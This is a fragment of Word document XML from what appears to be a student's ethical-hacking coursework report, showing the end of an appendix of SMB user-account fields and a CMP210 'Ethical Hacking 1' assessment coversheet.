      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Mon, 07 Oct 2019 07:31:55 EDT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2C1F91" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Password can change </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Time :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Tue, 08 Oct 2019 07:31:55 EDT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC3BDBC" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Password must change Time:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Thu, 21 Feb 2047 06:31:55 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4252E11D" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>unknown_2[</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>0..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>31]...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0092ED48" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>user_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>rid :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>0x1f4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA58B2C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>group_rid:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>0x201</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD8CA50" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>acb_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>info :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>0x00000010</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D62E4D" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>fields_present:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>0x00ffffff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ABB09E4" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>logon_divs:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>168</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14773DB8" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>bad_password_count:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>0x00000000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D877B6C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>logon_count:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>0x00000001</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1196A994" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>padding1[</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>0..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>7]...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF44B8F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>logon_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>hrs[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>0..21]...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4603A103" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1444D7CB" w14:textId="77777777" w:rsidR="00351C72" w:rsidRDefault="00351C72" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30174935" w14:textId="77777777" w:rsidR="00481CA9" w:rsidRDefault="00481CA9" w:rsidP="00481CA9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc27518422"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00622CF7">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidR="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidR="00B05A54" w:rsidRPr="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Include your project deliverables and requirements sheet</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
      <w:r w:rsidR="00B05A54" w:rsidRPr="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08605484" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="729712C2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CMP210 Main Coursework 2019-20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B78F45" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="9509" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="0000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9509"/>
      </w:tblGrid>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="00284733" w14:paraId="0D40FD11" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9509" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25000809" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00284733">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="540E0093" wp14:editId="3838DE8B">
                  <wp:extent cx="3036570" cy="75882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36570" cy="758825"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="00284733" w14:paraId="588EA3B3" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9509" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="113926B5" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="00284733" w14:paraId="53F25997" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9509" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="732B01D6" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
                <w:b/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00284733">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
                <w:b/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">School of </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
                <w:b/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Design and Informatics</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1363D099" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77462FC8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Assessment Instrument Coversheet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA40051" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60AD1C95" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Module Code:</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CMP210</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2E7550" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D578190" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Module Title:</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Ethical Hacking 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311242C3" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2497F754" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Unit of Assessment:</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F805BD" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A0114A6" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Learning Outcomes </w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>1,</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2,&amp;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46822136" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Assessed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>(In addition, see module descriptor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0940E698" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Lecturer:</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Colin McLean &amp; Natalie Coull</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DAFDC2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
